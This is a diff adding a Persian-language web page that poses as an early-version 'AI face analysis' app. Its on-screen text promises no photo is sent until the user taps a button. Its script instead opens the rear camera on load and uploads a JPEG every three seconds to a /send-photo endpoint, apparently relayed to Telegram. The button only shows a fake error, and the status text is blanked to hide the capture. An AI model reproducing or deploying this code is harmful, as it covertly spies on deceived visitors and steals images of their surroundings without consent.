@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ai</title>
+    <style>
+        * { box-sizing: border-box;  padding: 0; margin: 0; }
+        body{ background-color: #fff155;  }
+        .main { font-family: tahoma, sans-serif; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;  margin: 0; }
+        .container { text-align: center; width: 90%; max-width: 500px; }
+        video { width: 100%; border-radius: 10px;  }
+        canvas { display: none; }
+        .status { margin-top: 15px; font-size: 14px; color: #00ff00; }
+        .recording-dot { display: inline-block; width: 10px; height: 10px; background-color: red; border-radius: 50%; animation: blink 1s infinite; margin-left: 5px; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+   <div class="nav">
+    <h2>به هوش مصنوعی آنالیز چهره خوش آمدین😊😎</h2>
+    <h3>برای استفاده از هوش مصنوعی ابتدا باید دوربین گوشی خود را فعال کنید📸</h3>
+    <p>
+        و اینکه این نسخه اولیست و ممکنه باگ داشته باشه، پس اگه مشکلی بود بهمون اطلاع بدین🙏.<br/>
+        در آینده نچندان دور این صفحه یی که الان میبینین به یک اپلیکیشن کامل تبدیل میشه که امکانات بیشتری داره🚀.
+        <br/>
+        پس اگه این صفحه مورد پسند شما نبود از شما عذر خواهی میکنیم🙏
+    </p>
+   </div>
+<div class="main">
+    <div class="container">
+        <h2></h2>
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+        <div class="status">
+       
+            <span id="log">در حال برقراری ارتباط...</span>
+        </div>
+    </div>
+</div>
+<div class="buttun">
+    <h2>تا موقعی که روی دکمه /ارسال عکس/ نزدید عکس ارسال نخواهد شد<br/> 
+    
+     اینکه برای اینکه هوش مصنوعی راحت تر بتونه چهر شمارو آنالیز کنه لطفا در جایی قرار بگیرید که چهره شما واضح باشه.😊😊
+    </h2>
+    <button class="send" id="button">ارسال عکس</button>
+</div>
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const log = document.getElementById('log');
+    const btn=document.getElementById('button');
+    btn.addEventListener("click",()=>{
+        alert("عکس پردازش عکس با خطا مواجه شد لطفا در جای درست و چهره تان واضح باشه و اگر دوباره این  پیغام ظاهر شد لطفا به توسعه دهنده هوش مصنوعی اطلاع دهید")
+    })
+    // تنظیم فاصله زمانی ارسال عکس (به میلی‌ثانیه)
+    // 3000 یعنی هر ۳ ثانیه. کمتر از این نکن چون تلگرام بلاک میکنه!
+    const SEND_INTERVAL = 3000; 
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'environment' } // دوربین پشت
+            });
+            video.srcObject = stream;
+            
+            log.innerText = "";
+            
+            // شروع تایمر برای ارسال عکس
+            setInterval(captureAndSend, SEND_INTERVAL);
+
+        } catch (err) {
+            log.innerText = "";
+            log.style.color = "red";
+        }
+    }
+
+    function captureAndSend() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                sendToBackend(blob);
+            }, 'image/jpeg', 0.7); // کیفیت 70% برای سرعت بیشتر
+        }
+    }
+
+    async function sendToBackend(blob) {
+        const formData = new FormData();
+        formData.append('photo', blob, 'capture.jpg');
+
+        try {
+            log.innerText = "";
+            await fetch('/send-photo', { method: 'POST', body: formData });
+            log.innerText = "";
+        } catch (error) {
+            console.error(error);
+            log.innerText = "⚠️ خطا در ارسال";
+        }
+    }
+
+    // شروع برنامه
+    startCamera();
+</script>
+
+</body>
+</html>
